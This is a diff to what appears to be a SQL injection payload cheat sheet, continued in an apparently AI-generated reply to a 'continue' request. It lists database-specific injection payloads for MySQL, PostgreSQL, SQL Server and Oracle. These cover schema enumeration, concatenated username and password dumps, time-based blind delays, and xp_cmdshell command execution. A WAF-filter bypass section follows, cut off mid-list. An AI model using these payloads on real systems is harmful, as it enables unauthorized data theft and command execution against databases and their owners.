@@ -143,3 +143,94 @@ SELECT schema_name FROM information_schema.schemata
 
 ```
 Continue from Database specific payloads
+
+ Here's the continuation of database-specific SQL injection payloads:
+
+---
+
+### **8. Database-Specific Payloads (Continued)**
+
+#### **MySQL / MariaDB (Continued)**
+```sql
+-- List tables in current database  
+SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE()  
+
+-- List columns in a table  
+SELECT column_name FROM information_schema.columns WHERE table_name = 'users'  
+
+-- String concatenation  
+SELECT CONCAT(username, ':', password) FROM users  
+
+-- Conditional time delay  
+SELECT IF(1=1, SLEEP(5), 0)  
+```
+
+#### **PostgreSQL**
+```sql
+-- Version check  
+SELECT version()  
+
+-- List databases  
+SELECT datname FROM pg_database  
+
+-- List tables  
+SELECT table_name FROM information_schema.tables  
+
+-- String concatenation  
+SELECT username || ':' || password FROM users  
+
+-- Conditional time delay  
+SELECT pg_sleep(5) FROM users WHERE username='admin'  
+```
+
+#### **Microsoft SQL Server**
+```sql
+-- Version check  
+SELECT @@version  
+
+-- List databases  
+SELECT name FROM master..sysdatabases  
+
+-- List tables in current DB  
+SELECT table_name FROM information_schema.tables  
+
+-- Conditional time delay (SQL Server)  
+IF (1=1) WAITFOR DELAY '0:0:5'  
+
+-- Command execution (if xp_cmdshell enabled)  
+EXEC xp_cmdshell 'whoami'  
+```
+
+#### **Oracle**
+```sql
+-- Version check  
+SELECT * FROM v$version  
+
+-- List tables owned by current user  
+SELECT table_name FROM user_tables  
+
+-- String concatenation  
+SELECT username || ':' || password FROM users  
+
+-- Conditional time delay (DBMS_LOCK.SLEEP requires privileges)  
+BEGIN DBMS_LOCK.SLEEP(5); END; -- 
+```
+
+---
+
+### **9. Bypassing WAF/Filtering Techniques**
+
+```sql
+/* Case switching */
+' UnIoN SeLeCt 1,2,3 -- 
+
+/* Whitespace alternatives */
+'UNION/**/SELECT/**/1,2,3--
+
+/* Comment obfuscation */
+' UNION SELECT/*random*/1,password/*random*/FROM users--
+
+/* Hex encoding */
+' UNION SELECT 0x61646d696e,2,3 --  /* "admin" in hex */
+
+/* CHAR() function */
